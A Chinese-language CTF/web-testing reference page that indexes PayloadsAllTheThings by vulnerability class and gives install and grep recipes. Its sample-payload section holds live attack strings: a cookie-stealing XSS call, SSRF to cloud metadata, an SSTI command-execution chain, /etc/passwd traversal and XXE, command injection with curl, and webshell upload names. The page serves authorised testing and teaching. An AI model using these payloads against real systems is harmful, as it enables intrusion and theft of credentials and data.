---

phase: webapp
vuln_class: [tooling, payloads]
title: PayloadsAllTheThings 索引与字典接入
summary: 本地手册讲「为什么」，PAT 讲「还有哪些变体」。按漏洞类目映射到 PAT 目录，离线时用本篇示例 payload 顶住。
---

# PayloadsAllTheThings 索引与字典接入

用 Python 跑批量请求的骨架见 [[web/实践笔记/Python 请求工具集（requests、httpx 并发爆破）.md|python-requests]]；各类手法的判据与原理回到对应专项篇，如 [[web/漏洞分类/SQL注入/注入类漏洞测试手册（SQL注入、命令注入、SSTI）|SQL 注入]]、[[web/漏洞分类/XSS/XSS 测试手册.md|XSS]]、[[web/漏洞分类/SSRF/SSRF 测试手册.md|SSRF]]。

> **上游**：[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)，MIT License，Copyright (c) 2019 Swissky。
> 本篇的示例 payload 按 MIT 署名引用。批量字典需自行 clone（见 §5），仓库不 vendor。
>
> **锁定版本**：`3ac2790`（master @ 2026-08-27）。校验：`bash scripts/install_ctf_tools.sh --verify`，或 `git -C ~/.ctf-tools/PayloadsAllTheThings rev-parse --short HEAD`。

## 0. 什么时候用哪一边

| 需求 | 用哪边 |
|---|---|
| 搞懂触发条件、构造利用链 | 本地手册（`packs/kb/web/`） |
| 枚举过滤/WAF 的**所有**绕过变体 | PAT 批量字典 |
| 无网络、未 clone | 本篇 §3 的示例 payload |
| 有网络、要暴力枚举 | PAT + §4 的 grep 配方 |

**本地手册是叙事，PAT 是枚举。** 前者告诉你为什么某个 payload 成立，后者把同一手法的几百个变体摊开给你试。两者互补，不能互相替代。

PAT 路径全部相对 `PayloadsAllTheThings/` 根目录。

## 1. 类目映射表

| 本地篇目 | PAT 目录 | 入口文件 |
|---|---|---|
| `注入类/sql-injection.md` — union / 报错 / 盲注 / 时间 / 认证绕过 / 过滤绕过 | `SQL Injection/` | `README.md`、`Intruder/` |
| `注入类/sql-injection.md` — MySQL / MSSQL / PG / SQLite / Oracle 方言 | `SQL Injection/` | `MySQL*.md`、`PostgreSQL*.md` 等 |
| `client-side.md` — XSS payload、过滤绕过、DOM XSS | `XSS Injection/` | `README.md`、`Intruder/xss-payload-list.txt` |
| `client-side-advanced.md` — CSP 绕过、polyglot、mXSS | `XSS Injection/` | `README.md` 的 CSP / WAF bypass 段 |
| `注入类/server-side.md` — SSTI（Jinja2/Twig/Smarty/Mako） | `Server Side Template Injection/` | `README.md` |
| `注入类/server-side*.md` — SSRF、Host 头、DNS 重绑定、云 metadata | `Server Side Request Forgery/` | `README.md` |
| `注入类/server-side*.md` — LFI / RFI / `php://filter` | `File Inclusion/` | `README.md` |
| `注入类/server-side-advanced.md` — 路径穿越、Nginx alias | `Directory Traversal/` | `README.md` |
| `注入类/server-side-exec.md` — 命令注入 | `Command Injection/` | `README.md` |
| `注入类/server-side-exec.md` / `server-side-advanced.md` — 上传、polyglot、扩展名绕过 | `Upload Insecure Files/` | `README.md` |
| `注入类/server-side.md` — XXE（基础 / OOB / DOCX） | `XXE Injection/` | `README.md` |
| `注入类/server-side.md` — NoSQL / GraphQL / LDAP / XPATH | `NoSQL Injection/`、`LDAP Injection/`、`XPATH Injection/` | 各自 `README.md` |
| `注入类/server-side-deser.md` — Java / PHP / Python 反序列化 | `Insecure Deserialization/` | `README.md` |
| `认证与会话/auth-*.md` — JWT / OAuth / CORS / 开放重定向 | `JSON Web Token/`、`Open Redirect/`、`CORS Misconfiguration/` | 各自 `README.md` |
| `node-and-prototype.md` — 原型链污染 | `Prototype Pollution/` | `README.md` |
| `原型链污染/` — 污染本体与 gadget 表 | `Prototype Pollution/` | `README.md` |

## 2. 快速定位 PAT 子目录

不知道某手法落在哪个子目录时，按关键字反查：

```bash
PAT="webapp/payloads/PayloadsAllTheThings"

grep -R -i "waf.*bypass" "$PAT" --include="*.md" | head -20
grep -Rl "polyglot" "$PAT" --include="*.md" | head
```

## 3. 示例 payload（离线可用）

每块只留 2–3 条代表性 payload。**这只是让脚本能跑起来，不是完整字典。**

```sql
-- SQL Injection/
' OR '1'='1' -- 
' UNION SELECT NULL,NULL,@@version -- 
1' ORDER BY 10-- -
```

```html
<!-- XSS Injection/ -->
<script>alert(1)</script>
<img src=x onerror="alert(1)">
<svg onload="fetch('https://example.com/?c='+document.cookie)">
```

```http
# Server Side Request Forgery/
http://169.254.169.254/latest/meta-data/
http://example.com@169.254.169.254/
http://0.0.0.0%09@example.com
```

```python
# Server Side Template Injection/
{{7*7}}      # Jinja2/Twig 探针，返回 49 说明有注入
{{config}}   # Jinja2 配置泄露
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```http
# File Inclusion/ + Directory Traversal/
../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
....//....//....//etc/passwd
```

```bash
# Command Injection/
; id
| cat /etc/passwd
$(curl https://example.com)
```

```http
# Upload Insecure Files/
filename="shell.php%00.jpg"
filename="shell.phtml"
Content-Type: image/jpeg
```

```xml
<!-- XXE Injection/ -->
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://example.com/xxe.dtd"> %xxe;]>
```

```js
// NoSQL / LDAP / XPATH
{"username": {"$ne": null}, "password": {"$ne": null}}
' || '1'=='1
*)(uid=*))(|(uid=*
' or '1'='1
```

```http
# Open Redirect / CORS
https://example.com@attacker.example.com/
https://example.com%2eattacker.example.com/
Origin: https://example.com
```

```text
# JSON Web Token/
alg:none 变体、弱密钥字典、kid 路径穿越 —— 见 JSON Web Token/README.md
```

```http
# CRLF Injection/
value%0d%0aSet-Cookie:admin=1
value\r\n\r\n<script>alert(1)</script>
```

## 4. grep 配方

clone 之后，按手法直接捞变体：

```bash
PAT="webapp/payloads/PayloadsAllTheThings"

# XSS 过滤绕过
grep -R "onerror" "$PAT/XSS Injection" | head

# SQLi 方言差异
ls "$PAT/SQL Injection"
grep -R "information_schema" "$PAT/SQL Injection" | head

# SSRF 云 metadata
grep -R "169.254.169.254" "$PAT/Server Side Request Forgery" | head

# SSTI 引擎特征
grep -R "__globals__" "$PAT/Server Side Template Injection" | head

# LFI wrapper
grep -R "php://filter" "$PAT/File Inclusion" | head
grep -R "etc/passwd" "$PAT/Directory Traversal" | head

# 上传扩展名技巧
grep -R "phtml" "$PAT/Upload Insecure Files" | head

# 命令注入分隔符
grep -R "curl.*example.com" "$PAT/Command Injection" | head
```

每个类目下还有 `Intruder/` 子目录，是现成的 Burp Intruder 字典：

```bash
ls "$PAT/XSS Injection/Intruder"
ls "$PAT/SQL Injection/Intruder"
ls "$PAT/Command Injection/Intruder"
ls "$PAT/Directory Traversal/Intruder"
```

## 5. 安装

优先用安装脚本（自动 clone + symlink + 校验）：

```bash
bash scripts/install_ctf_tools.sh pat           # clone 或更新 PAT
bash scripts/install_ctf_tools.sh all           # PAT + 其他工具
bash scripts/install_ctf_tools.sh --verify      # 打印 PAT <short-sha> at <path>
bash scripts/install_ctf_tools.sh --dry-run pat # 预览不落盘
```

手动装：

```bash
PAT_DIR="$HOME/.ctf-tools/PayloadsAllTheThings"
WEB_PAT_DIR="webapp/payloads/PayloadsAllTheThings"

git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR"

# 软链接，让 Glob/Grep 能在 ctf-web 下找到（首选）
mkdir -p "$(dirname "$WEB_PAT_DIR")"
ln -sfn "$PAT_DIR" "$WEB_PAT_DIR"

# 软链接失败时（Windows / 只读 FS）直接 clone 到目标位置
[ -e "$WEB_PAT_DIR" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$WEB_PAT_DIR"

git -C "$PAT_DIR" rev-parse --short HEAD
ls "$WEB_PAT_DIR/XSS Injection" | head
```

更新：

```bash
git -C ~/.ctf-tools/PayloadsAllTheThings pull --ff-only
# 或
bash scripts/install_ctf_tools.sh pat --force
```

### 5.1 Agent 侧按需懒加载

```bash
PAT_DIR="webapp/payloads/PayloadsAllTheThings"
FALLBACK="$HOME/.ctf-tools/PayloadsAllTheThings"

if [ ! -d "$PAT_DIR/.git" ] && [ ! -d "$FALLBACK/.git" ]; then
  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAT_DIR" 2>/dev/null \
    || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$FALLBACK"
  [ -d "$PAT_DIR/.git" ] || ln -sfn "$FALLBACK" "$PAT_DIR"
fi
```

`webapp/payloads/`、`PayloadsAllTheThings/`、`.ctf-tools/` 全部 gitignore，仓库不 vendor 任何 PAT 文件。

## 6. 坑

- **PAT 目录名带空格**（`XSS Injection`）。shell 里必须加引号，否则 grep 会把 `XSS` 和 `Injection` 当两个路径。
- **默认分支是 `master`**。`--depth 1` 够用，全历史对 payload 检索没价值。
- **`.github/` 和 `Methodology and Resources/` 是元文档不是 payload**，grep 时要排除，否则结果里一半是 README 目录。
- **有独立 PAT 目录的 CVE**（如 `CVE Exploits/`）先跟本地手册交叉核对，PAT 的 CVE 条目常滞后于官方公告。
- **不要把 PAT 的 payload 原样当结论**。PAT 是「值得一试的字符串集合」，命中率靠本地手册的判据筛。

## 7. 署名

PayloadsAllTheThings 为 MIT 许可 —— Copyright (c) 2019 Swissky。
本篇示例 payload 按 MIT 署名引用；PAT 仓库本身不随本项目分发，由用户自行 clone。
内容仅用于教学与研究；只对获得授权的系统测试（见 PAT 的 `DISCLAIMER.md`）。
